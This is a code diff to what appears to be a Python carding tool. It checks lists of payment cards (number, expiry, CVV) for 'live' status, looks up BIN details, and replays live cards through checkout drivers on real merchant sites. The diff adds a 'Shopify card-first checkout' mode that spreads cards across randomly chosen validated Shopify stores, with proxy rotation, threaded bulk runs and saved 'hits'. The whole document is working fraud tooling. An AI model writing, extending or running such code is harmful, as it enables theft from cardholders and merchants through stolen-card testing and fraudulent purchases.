+            lines.append(f"  {'Country':<10}: {WHITE}{country_str(bin_res)}{R}")
         if bin_res.get("prepaid"):
-            print(f"  {'Prepaid':<10}: {YELLOW}yes{R}")
-
+            lines.append(f"  {'Prepaid':<10}: {YELLOW}yes{R}")
     if api_res.get("msg"):
         clean = TAG_RE.sub("", str(api_res["msg"])).strip()
-        print(f"  {'Detail':<10}: {DIM}{clean}{R}")
-
+        lines.append(f"  {'Detail':<10}: {DIM}{clean}{R}")
     if co_res:
         cs = co_res.get("status", "unknown").lower()
         col = STATUS_COLOR.get(cs, YELLOW)
-        print(f"  {'Driver':<10}: {col}{cs.upper()}{R}")
+        lines.append(f"  {'Driver':<10}: {col}{cs.upper()}{R}")
         if co_res.get("message"):
-            print(f"  {'Drv.Msg':<10}: {WHITE}{co_res['message']}{R}")
+            lines.append(f"  {'Drv.Msg':<10}: {WHITE}{co_res['message']}{R}")
         if co_res.get("url"):
-            print(f"  {'URL':<10}: {CYAN}{co_res['url']}{R}")
+            lines.append(f"  {'URL':<10}: {CYAN}{co_res['url']}{R}")
         if co_res.get("code"):
-            print(f"  {'Code':<10}: {WHITE}{co_res['code']}{R}")
+            lines.append(f"  {'Code':<10}: {WHITE}{co_res['code']}{R}")
         if co_res.get("elapsed"):
-            print(f"  {'Time':<10}: {DIM}{co_res['elapsed']}s{R}")
-    print(CYAN + "═" * 62)
+            lines.append(f"  {'Time':<10}: {DIM}{co_res['elapsed']}s{R}")
+    print()
+    boxed(lines, width=BOX_W)
     print()
 
-def render_compact(cc: str, api_res: dict,
-                   bin_res: dict | None = None,
+def render_compact(cc: str, api_res: dict, bin_res: dict | None = None,
                    co_res: dict | None = None) -> None:
     st = str(api_res.get("status", "unknown")).lower()
     col = STATUS_COLOR.get(st, YELLOW)
     tag = f"{col}{st.upper():<5}{R}"
-
     extras = []
     if api_res.get("network"):
         extras.append(str(api_res["network"]))
@@ -816,7 +1148,6 @@ def render_compact(cc: str, api_res: dict,
     if b_bits:
         extras.append(b_bits)
     extra = ("  " + DIM + "  ·  ".join(extras) + R) if extras else ""
-
     co = ""
     if co_res:
         cs = co_res.get("status", "unknown").lower()
@@ -824,19 +1155,18 @@ def render_compact(cc: str, api_res: dict,
     print(f"  {tag}  {WHITE}{cc}{R}{extra}{co}")
 
 # =========================================================
-#  SINGLE
+#  FLOWS
 # =========================================================
 
 def run_single() -> None:
     pool = build_pool()
     site = CFG.get("checkout_site", "").strip()
     driver = resolve_driver(site, pool) if site else None
-    if site:
-        print("  " + DIM + f"driver: {type(driver).__name__ if driver else 'none'}"
-              f"  target: {site}" + R)
-    else:
-        print("  " + DIM + "no checkout site configured — API check only" + R)
-
+    print()
+    boxed([
+        f"  {WHITE}target:{R} {site or '(none)'}",
+        f"  {WHITE}driver:{R} {type(driver).__name__ if driver else '(none)'}",
+    ])
     while True:
         cc = input("  " + CYAN + "cc ▸ " + R).strip()
         if not cc:
@@ -845,13 +1175,10 @@ def run_single() -> None:
         if not CC_RE.match(cc):
             print("  " + RED + "bad format — card|mm|yy|cvv")
             continue
-
-        bin_no = extract_bin(cc)
         with Spinner("api check"):
             api_res = api_check(cc, pool=pool)
         with Spinner("bin lookup"):
-            bin_res = lookup_bin(bin_no, pool=pool)
-
+            bin_res = lookup_bin(extract_bin(cc), pool=pool)
         co_res = None
         if driver and api_res.get("status") == "live":
             with Spinner("driver"):
@@ -859,27 +1186,21 @@ def run_single() -> None:
                     co_res = driver.test(cc)
                 except Exception as e:
                     co_res = {"status": "error", "message": str(e)}
-
         render_block(cc, api_res, bin_res, co_res)
         if api_res.get("status") == "live":
             Storage(ensure_storage()).write(cc, api_res, bin_res, co_res)
-
         if input("  " + YELLOW + "another? (y/n) ▸ " + R).strip().lower() != "y":
             break
-
-# =========================================================
-#  BULK
-# =========================================================
 
 def run_bulk() -> None:
     pool = build_pool()
     site = CFG.get("checkout_site", "").strip()
     driver = resolve_driver(site, pool) if site else None
-    if site:
-        print("  " + DIM + f"driver: {type(driver).__name__ if driver else 'none'}"
-              f"  target: {site}" + R)
+    print()
+    boxed([f"  {WHITE}target:{R} {site or '(none)'}",
+           f"  {WHITE}driver:{R} {type(driver).__name__ if driver else '(none)'}"])
 
-    src = choose_file(ext=".txt", prompt_label="card list (.txt)")
+    src = choose_file(ext=".txt", prompt_label="card list")
     if not src:
         return
 
@@ -916,21 +1237,12 @@ def run_bulk() -> None:
 
     print("  " + DIM + f"loaded {len(ccs)}  ·  dropped {dropped} dupes" + R)
 
-    # ---- OUTPUT FOLDER PICKER ----
     banner()
     default_folder = ensure_storage()
-    print()
-    print("  " + CYAN + "where to save hits?" + R)
-    boxed([
-        f"  {WHITE}[1]{R}  default  {DIM}{default_folder}{R}",
-        f"  {WHITE}[2]{R}  choose a folder",
-    ], width=62)
+    boxed([f"  {WHITE}[1]{R}  default  {DIM}{default_folder}{R}",
+           f"  {WHITE}[2]{R}  choose folder"])
     out_choice = input("  " + YELLOW + "▸ " + R).strip()
-    if out_choice == "2":
-        chosen = choose_dir("output folder for hits")
-        out_dir = chosen or default_folder
-    else:
-        out_dir = default_folder
+    out_dir = (choose_dir("output folder") if out_choice == "2" else None) or default_folder
 
     raw_w = input("  " + CYAN + "threads [8] ▸ " + R).strip()
     try:
@@ -940,14 +1252,10 @@ def run_bulk() -> None:
 
     store = Storage(out_dir)
     print()
-    print(CYAN + "═" * 62)
-    print(f"  {WHITE}BULK{R}  ·  {WHITE}{len(ccs)}{R} cards  ·  "
-          f"{WHITE}{workers}{R} threads"
-          + (f"  ·  {WHITE}{len(pool)}{R} proxies" if pool else "")
-          + (f"  ·  driver: {WHITE}{type(driver).__name__}{R}" if driver else ""))
-    print(f"  hits ▸ {DIM}{store.hits_path}{R}")
-    print(f"  full ▸ {DIM}{store.full_path}{R}")
-    print(CYAN + "═" * 62)
+    boxed([
+        f"  {WHITE}BULK{R}  {len(ccs)} cards  {workers} threads",
+        f"  hits ▸ {DIM}{store.hits_path}{R}",
+    ])
     print()
 
     counts = {"live": 0, "dead": 0, "error": 0, "other": 0}
@@ -956,7 +1264,7 @@ def run_bulk() -> None:
     t0 = time.time()
     total = len(ccs)
 
-    def worker(cc: str):
+    def worker(cc):
         api_res = api_check(cc, pool=pool)
         bin_res = lookup_bin(extract_bin(cc), pool=pool)
         co_res = None
@@ -983,67 +1291,47 @@ def run_bulk() -> None:
                 if co_res:
                     cs = co_res.get("status", "unknown").lower()
                     co_counts[cs] = co_counts.get(cs, 0) + 1
-
                 clear_status()
                 render_compact(cc, api_res, bin_res, co_res)
-
                 ck_f.write(f"{st}|{cc}\n")
                 ck_f.flush()
                 if st == "live":
                     store.write(cc, api_res, bin_res, co_res)
                     hits += 1
-
                 status_line("  " + progress_bar(done_n, total))
             clear_status()
 
     elapsed = time.time() - t0
     rate = total / max(elapsed, 0.001)
     print()
-    print(CYAN + "═" * 62)
-    print(WHITE + "  DONE")
-    print(f"  Live     : {GREEN}{counts['live']}{R}")
-    print(f"  Dead     : {RED}{counts['dead']}{R}")
-    print(f"  Error    : {YELLOW}{counts['error']}{R}")
-    if counts["other"]:
-        print(f"  Other    : {YELLOW}{counts['other']}{R}")
-    if co_counts:
-        print(f"  {DIM}driver breakdown:{R}")
-        for k, v in co_counts.items():
-            print(f"    {STATUS_COLOR.get(k, YELLOW)}{k:<10}{R} {v}")
-    print(f"  Elapsed  : {WHITE}{elapsed:.1f}s{R}  ·  {WHITE}{rate:.1f} c/s{R}")
-    print(f"  Hits     : {GREEN}{hits}{R}  ▸  {DIM}{store.hits_path}{R}")
-    print(CYAN + "═" * 62)
-
-# =========================================================
-#  REPLAY
-# =========================================================
+    boxed([
+        f"  {WHITE}DONE{R}",
+        f"  Live     : {GREEN}{counts['live']}{R}",
+        f"  Dead     : {RED}{counts['dead']}{R}",
+        f"  Error    : {YELLOW}{counts['error']}{R}",
+        f"  Elapsed  : {WHITE}{elapsed:.1f}s{R}  {WHITE}{rate:.1f} c/s{R}",
+        f"  Hits     : {GREEN}{hits}{R}  ▸  {DIM}{store.hits_path}{R}",
+    ])
 
 def run_replay() -> None:
-    path = choose_file(ext=".txt", prompt_label="hits file (.txt)")
+    path = choose_file(ext=".txt", prompt_label="hits file")
     if not path:
         return
-
     with open(path, "r", encoding="utf-8", errors="ignore") as f:
-        ccs = [ln.strip() for ln in f
-               if ln.strip() and not ln.strip().startswith("#")]
+        ccs = [ln.strip() for ln in f if ln.strip() and not ln.strip().startswith("#")]
     if not ccs:
-        print("  " + RED + "no cards in file")
+        print("  " + RED + "no cards")
         return
-
     site = CFG.get("checkout_site", "").strip()
     if not site:
-        print("  " + RED + "no checkout site configured — Settings [2]")
+        print("  " + RED + "no checkout site — Settings [2]")
         return
     pool = build_pool()
     driver = resolve_driver(site, pool)
     if not driver:
-        print("  " + RED + "no driver resolved")
+        print("  " + RED + "no driver")
         return
-
-    print("  " + DIM + f"replaying {len(ccs)} cards through "
-          f"{type(driver).__name__}" + R)
     store = Storage(ensure_storage())
-
     for i, cc in enumerate(ccs, 1):
         with Spinner(f"[{i}/{len(ccs)}] {cc}"):
             try:
@@ -1052,16 +1340,149 @@ def run_replay() -> None:
                 co_res = {"status": "error", "message": str(e)}
         st = co_res.get("status", "unknown")
         col = STATUS_COLOR.get(st.lower(), YELLOW)
-        print(f"  {col}{st.upper():<12}{R}  {cc}  "
-              f"{DIM}{co_res.get('message','')}{R}")
+        print(f"  {col}{st.upper():<12}{R}  {cc}  {DIM}{co_res.get('message','')}{R}")
         if co_res.get("url"):
             print(f"  {CYAN}{co_res['url']}{R}")
         with open(store.checkout_path, "a", encoding="utf-8") as f:
             f.write(f"{cc}\t{st}\t{co_res.get('message','')}\n")
+        if co_res.get("url"):
+            with open(store.urls_path, "a", encoding="utf-8") as f:
+                f.write(f"{cc}\t{co_res['url']}\n")
+    print()
+    boxed([f"  {GREEN}replayed {len(ccs)} cards{R}",
+           f"  results ▸ {DIM}{store.checkout_path}{R}",
+           f"  urls    ▸ {DIM}{store.urls_path}{R}"])
+
+# ---------- shopify category checkout ----------
+
+def run_shopify_category() -> None:
+    pool = build_pool()
+    stores = load_cached_stores()
+    if not stores:
+        print()
+        boxed([f"  {YELLOW}no store cache — validating now{R}",
+               f"  {DIM}this takes ~3-5 minutes for {len(SHOPIFY_DOMAINS)} domains{R}"])
+        yn = input("  " + YELLOW + "run validation? (y/n) ▸ " + R).strip().lower()
+        if yn != "y":
+            return
+        stores = validate_all_stores(pool)
+        if not stores:
+            print("  " + RED + "no live stores found")
+            return
+
+    cats = get_categories(stores)
+    if not cats:
+        print("  " + RED + "no categories found")
+        return
 
     print()
-    print("  " + GREEN + f"replayed {len(ccs)} cards" + R)
-    print("  " + DIM + f"results ▸ {store.checkout_path}" + R)
+    print(CYAN + "  ┌─ product categories " + "─" * 40 + "┐" + R)
+    for i, c in enumerate(cats, 1):
+        print(f"  {WHITE}[{i:>2}]{R}  {c}")
+    print(f"  {WHITE}[ 0]{R}  all categories")
+    print(f"  {WHITE}[ r]{R}  re-validate stores")
+    print(f"  {WHITE}[ q]{R}  cancel")
+    print(CYAN + "  └" + "─" * 58 + "┘" + R)
+
+    sel = input("  " + YELLOW + "select (comma-separated) ▸ " + R).strip()
+    if sel.lower() == "q":
+        return
+    if sel.lower() == "r":
+        stores = validate_all_stores(pool)
+        save_store_cache(stores)
+        return
+    if sel == "0" or sel == "":
+        chosen_cats = cats
+    else:
+        chosen_cats = []
+        for part in sel.split(","):
+            try:
+                idx = int(part.strip()) - 1
+                if 0 <= idx < len(cats):
+                    chosen_cats.append(cats[idx])
+            except ValueError:
+                pass
+
+    if not chosen_cats:
+        print("  " + RED + "no categories selected")
+        return
+
+    filtered = [s for s in stores
+                if any(c in s.get("categories", []) for c in chosen_cats)]
+    if not filtered:
+        print("  " + RED + "no stores match")
+        return
+
+    print()
+    boxed([f"  {GREEN}{len(filtered)} stores{R}  ·  {len(chosen_cats)} categories",
+           f"  {' · '.join(chosen_cats[:4])}" + (" ..." if len(chosen_cats) > 4 else "")])
+
+    src = choose_file(ext=".txt", prompt_label="card list")
+    if not src:
+        return
+
+    with open(src, "r", encoding="utf-8", errors="ignore") as f:
+        ccs = []
+        for ln in f:
+            s = ln.strip()
+            if s and not s.startswith("#"):
+                ccs.append(s)
+    seen = set()
+    ccs = [c for c in ccs if not (c in seen or seen.add(c))]
+    if not ccs:
+        print("  " + RED + "empty")
+        return
+
+    store = Storage(ensure_storage())
+    total = len(ccs)
+    live_count = 0
+    url_count = 0
+    print()
+    boxed([f"  {WHITE}SHOPIFY CARD-FIRST{R}  {total} cards",
+           f"  urls ▸ {DIM}{store.urls_path}{R}"])
+    print()
+
+    def worker(cc):
+        api_res = api_check(cc, pool=pool)
+        bin_res = lookup_bin(extract_bin(cc), pool=pool)
+        co_res = None
+        if api_res.get("status") == "live":
+            s = random.choice(filtered)
+            drv = ShopifyCartDriver(s["domain"], pool=pool)
+            try:
+                co_res = drv.test(cc)
+            except Exception as e:
+                co_res = {"status": "error", "message": str(e)}
+        return cc, api_res, bin_res, co_res
+
+    with ThreadPoolExecutor(max_workers=6) as tp:
+        futures = {tp.submit(worker, cc): cc for cc in ccs}
+        done = 0
+        status_line("  " + progress_bar(0, total))
+        for fut in as_completed(futures):
+            cc, api_res, bin_res, co_res = fut.result()
+            done += 1
+            st = str(api_res.get("status", "unknown")).lower()
+            if st == "live":
+                live_count += 1
+                if co_res and co_res.get("url"):
+                    url_count += 1
+            clear_status()
+            render_compact(cc, api_res, bin_res, co_res)
+            if co_res and co_res.get("url"):
+                print(f"  {CYAN}↳ {co_res['url']}{R}")
+            if st == "live":
+                store.write(cc, api_res, bin_res, co_res)
+            status_line("  " + progress_bar(done, total))
+        clear_status()
+
+    print()
+    boxed([
+        f"  {WHITE}SHOPIFY DONE{R}",
+        f"  Live     : {GREEN}{live_count}{R}",
+        f"  URLs     : {CYAN}{url_count}{R}",
+        f"  Urls out : {DIM}{store.urls_path}{R}",
+    ])
 
 # =========================================================
 #  PROXY MENU
@@ -1084,32 +1505,27 @@ def proxy_menu() -> None:
         if c == "1":
             banner()
             host = input("  " + CYAN + "host ▸ " + R).strip()
-            if not host:
-                continue
+            if not host: continue
             port = input("  " + CYAN + "port ▸ " + R).strip()
             user = input("  " + CYAN + "user ▸ " + R).strip()
             pwd  = input("  " + CYAN + "pass ▸ " + R).strip()
             scheme = input("  " + CYAN + "scheme [http/socks5] ▸ " + R).strip() or "http"
             entry = (f"{scheme}://{user}:{pwd}@{host}:{port}"
                      if user and pwd else f"{scheme}://{host}:{port}")
-            boxed([
-                f"  {WHITE}scheme {R}: {scheme}",
-                f"  {WHITE}host   {R}: {host}",
-                f"  {WHITE}port   {R}: {port}",
-                f"  {WHITE}user   {R}: {user or '(none)'}",
-                f"  {WHITE}pass   {R}: {'*' * len(pwd) if pwd else '(none)'}",
-                f"  {WHITE}result {R}: {entry}",
-            ])
+            boxed([f"  {WHITE}scheme {R}: {scheme}",
+                   f"  {WHITE}host   {R}: {host}",
+                   f"  {WHITE}port   {R}: {port}",
+                   f"  {WHITE}user   {R}: {user or '(none)'}",
+                   f"  {WHITE}pass   {R}: {'*' * len(pwd) if pwd else '(none)'}",
+                   f"  {WHITE}result {R}: {entry}"])
             if input("  " + YELLOW + "confirm? (y/n) ▸ " + R).strip().lower() == "y":
                 CFG.setdefault("proxies", []).append(entry)
                 save_config(CFG)
                 print("  " + GREEN + "saved." + R)
                 time.sleep(0.6)
-
         elif c == "2":
-            p = choose_file(ext=".txt", prompt_label="proxy list (.txt)")
-            if not p:
-                continue
+            p = choose_file(ext=".txt", prompt_label="proxy list")
+            if not p: continue
             n = 0
             with open(p, "r", encoding="utf-8", errors="ignore") as f:
                 for ln in f:
@@ -1120,7 +1536,6 @@ def proxy_menu() -> None:
             save_config(CFG)
             print("  " + GREEN + f"imported {n}" + R)
             time.sleep(0.8)
-
         elif c == "3":
             if not proxies:
                 print("  " + DIM + "(none)" + R)
@@ -1128,10 +1543,8 @@ def proxy_menu() -> None:
                 for i, p in enumerate(proxies, 1):
                     print(f"  {WHITE}{i:>3}.{R} {p}")
             input("\n  " + DIM + "enter" + R)
-
         elif c == "4":
-            if not proxies:
-                continue
+            if not proxies: continue
             for i, p in enumerate(proxies, 1):
                 print(f"  {WHITE}{i:>3}.{R} {p}")
             idx = input("  " + CYAN + "index ▸ " + R).strip()
@@ -1144,14 +1557,12 @@ def proxy_menu() -> None:
                     time.sleep(0.6)
             except ValueError:
                 pass
-
         elif c == "5":
             if input("  " + RED + "clear ALL? (y/n) ▸ " + R).strip().lower() == "y":
                 CFG["proxies"] = []
                 save_config(CFG)
                 print("  " + GREEN + "cleared" + R)
                 time.sleep(0.6)
-
         elif c in ("0", ""):
             return
 
@@ -1167,13 +1578,12 @@ def settings_menu() -> None:
         boxed([
             f"  {WHITE}[1]{R}  Storage folder   {DIM}{CFG.get('storage_folder','')}{R}",
             f"  {WHITE}[2]{R}  Checkout site    {DIM}{CFG.get('checkout_site','') or '(none)'}{R}",
-            f"  {WHITE}[3]{R}  Address config   {DIM}({filled}/10 fields set){R}",
+            f"  {WHITE}[3]{R}  Address config   {DIM}({filled}/10){R}",
             f"  {WHITE}[4]{R}  Driver           {DIM}{CFG.get('driver','auto')}{R}",
             f"  {WHITE}[5]{R}  Tap API key      {DIM}{'set' if CFG.get('tap_api_key') else '(none)'}{R}",
             f"  {WHITE}[0]{R}  Back",
         ], width=66)
         c = input("  " + YELLOW + "select ▸ " + R).strip()
-
         if c == "1":
             p = choose_dir("storage folder")
             if p:
@@ -1185,17 +1595,14 @@ def settings_menu() -> None:
                 except Exception as e:
                     print("  " + RED + str(e) + R)
                 time.sleep(0.6)
-
         elif c == "2":
-            p = input("  " + CYAN + "site (ex: store.com) ▸ " + R).strip()
+            p = input("  " + CYAN + "site (ex: tatcha.com) ▸ " + R).strip()
             CFG["checkout_site"] = p
             save_config(CFG)
             print("  " + GREEN + "saved" + R)
             time.sleep(0.6)
-
         elif c == "3":
             address_menu()
-
         elif c == "4":
             print("  " + DIM + "drivers: " + ", ".join(sorted(DRIVER_REGISTRY.keys()))
                   + ", auto" + R)
@@ -1207,29 +1614,22 @@ def settings_menu() -> None:
             else:
                 print("  " + RED + "unknown driver" + R)
             time.sleep(0.7)
-
         elif c == "5":
             k = input("  " + CYAN + "Tap API key ▸ " + R).strip()
             CFG["tap_api_key"] = k
             save_config(CFG)
             print("  " + GREEN + "saved" + R)
             time.sleep(0.6)
-
         elif c in ("0", ""):
             return
 
 def address_menu() -> None:
     fields = [
-        ("first_name",    "First name"),
-        ("last_name",     "Last name"),
-        ("address1",      "Address line 1"),
-        ("address2",      "Address line 2"),
-        ("city",          "City"),
-        ("province_code", "Province/State code"),
-        ("country_code",  "Country code (US, GB, TR...)"),
-        ("zip",           "ZIP/Postal code"),
-        ("phone",         "Phone"),
-        ("email",         "Email"),
+        ("first_name", "First name"), ("last_name", "Last name"),
+        ("address1", "Address line 1"), ("address2", "Address line 2"),
+        ("city", "City"), ("province_code", "Province/State code"),
+        ("country_code", "Country code (US, GB, TR...)"),
+        ("zip", "ZIP/Postal code"), ("phone", "Phone"), ("email", "Email"),
     ]
     while True:
         banner()
@@ -1268,8 +1668,9 @@ def menu() -> str:
         f"  {WHITE}[1]{R}  Single check",
         f"  {WHITE}[2]{R}  Bulk check",
         f"  {WHITE}[3]{R}  Replay driver on hits file",
-        f"  {WHITE}[4]{R}  Proxy configuration",
-        f"  {WHITE}[5]{R}  Settings   {DIM}(site: {site}  driver: {driver}){R}",
+        f"  {WHITE}[4]{R}  Shopify card-first checkout  {DIM}(category){R}",
+        f"  {WHITE}[5]{R}  Proxy configuration",
+        f"  {WHITE}[6]{R}  Settings   {DIM}(site: {site}  driver: {driver}){R}",
         f"  {WHITE}[0]{R}  Exit",
     ], width=66)
     print()
@@ -1278,7 +1679,6 @@ def menu() -> str:
 def main() -> None:
     if not auth_gate():
         return
-
     banner()
     type_out("  initializing...", delay=0.02, color=DIM)
     time.sleep(0.3)
@@ -1287,26 +1687,26 @@ def main() -> None:
     while True:
         c = menu()
         if c == "1":
-            banner()
-            run_single()
+            banner(); run_single()
         elif c == "2":
-            banner()
-            run_bulk()
+            banner(); run_bulk()
             input("\n  " + DIM + "enter" + R)
         elif c == "3":
-            banner()
-            run_replay()
+            banner(); run_replay()
             input("\n  " + DIM + "enter" + R)
         elif c == "4":
-            proxy_menu()
+            banner(); run_shopify_category()
+            input("\n  " + DIM + "enter" + R)
         elif c == "5":
+            proxy_menu()
+        elif c == "6":
             settings_menu()
         elif c in ("0", "q", "exit"):
             print()
             type_out("  goodbye...", delay=0.03, color=RED)
             return
         else:
-            print("  " + RED + "invalid selection" + R)
+            print("  " + RED + "invalid" + R)
             time.sleep(0.4)
 
 if __name__ == "__main__":
